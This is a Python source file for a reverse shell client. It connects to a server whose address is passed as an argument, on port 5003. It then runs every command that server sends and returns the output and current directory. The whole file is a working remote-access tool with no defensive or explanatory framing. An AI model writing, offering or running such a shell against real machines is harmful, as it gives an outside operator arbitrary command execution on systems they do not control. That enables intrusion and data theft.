import socket
import os
import subprocess
import sys

class Shell():
    def __init__(self):
        self.SERVER_HOST = sys.argv[1]
        self.SERVER_PORT = 5003
        self.BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        # separator string for sending 2 messages in one go
        self.SEPARATOR = "<sep>"
        # create the socket object
        self.s = socket.socket()

    def create_socket(self):
        # connect to the server
        self.s.connect((self.SERVER_HOST, self.SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        self.s.send(cwd.encode())
    
    def command_loop(self):
        while True:
            # receive the command from the server
            command = self.s.recv(self.BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{self.SEPARATOR}{cwd}"
            self.s.send(message.encode())
        # close client connection
        self.s.close()

def main():
    shell = Shell()
    shell.create_socket()
    shell.command_loop()

if __name__ == "__main__":
    main()